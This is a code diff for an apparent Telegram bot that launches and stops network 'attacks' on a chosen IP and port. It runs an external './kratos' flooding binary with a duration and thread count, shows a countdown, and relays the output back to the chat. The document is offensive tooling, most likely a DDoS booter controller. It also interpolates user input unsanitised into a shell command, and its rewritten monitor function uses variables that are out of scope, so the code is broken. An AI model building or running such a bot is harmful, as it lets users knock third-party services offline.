@@ -60,30 +60,55 @@ async def handle_buttons(event):
                 await message.edit(
                     f"IP: {ip.decode()}:{port.decode()}\nStatus: Attack stopped",
                     buttons=[
-                        [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|{duration.decode()}"), Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
+                        [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|{duration}"), Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
                     ]
                 )
                 del message_cache[(chat_id, ip, port)]
         else:
             await event.answer("No running attack to stop!", alert=True)
 
-
 async def run_attack(chat_id, ip, port, duration, message):
     try:
+        # Running the command and capturing its output
         process = await asyncio.create_subprocess_shell(
             f"./kratos {ip} {port} {duration} 750",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
 
+        # Monitor the process output in the background
+        asyncio.create_task(monitor_process(chat_id, process, message))
         # Start countdown in background
         asyncio.create_task(countdown_timer(chat_id, ip, port, duration, message))
-        # Monitor process in the background
-        asyncio.create_task(monitor_process(chat_id, process))
+
         return process
     except Exception as e:
         await client.send_message(chat_id, f"Failed to start attack: {e}")
         return None
+
+async def monitor_process(chat_id, process, message):
+    try:
+        stdout, stderr = await process.communicate()
+        
+        if stdout:
+            output = stdout.decode()
+            await message.edit(
+                f"Process Output:\n{output}",
+                buttons=[
+                    [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
+                ]
+            )
+        
+        if stderr:
+            error = stderr.decode()
+            await message.edit(
+                f"Process Error:\n{error}",
+                buttons=[
+                    [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
+                ]
+            )
+    except Exception as e:
+        await client.send_message(chat_id, f"Error monitoring process: {e}")
 
 async def countdown_timer(chat_id, ip, port, duration, message):
     remaining_time = duration
@@ -105,16 +130,6 @@ async def countdown_timer(chat_id, ip, port, duration, message):
             ]
         )
         del running_processes[(chat_id, ip, port)]
-
-async def monitor_process(chat_id, process):
-    try:
-        stdout, stderr = await process.communicate()
-        if stdout:
-            await client.send_message(chat_id, f"Process output: {stdout.decode()}")
-        if stderr:
-            await client.send_message(chat_id, f"Process error: {stderr.decode()}")
-    except Exception as e:
-        await client.send_message(chat_id, f"Error monitoring process: {e}")
 
 if __name__ == "__main__":
     client.run_until_disconnected()
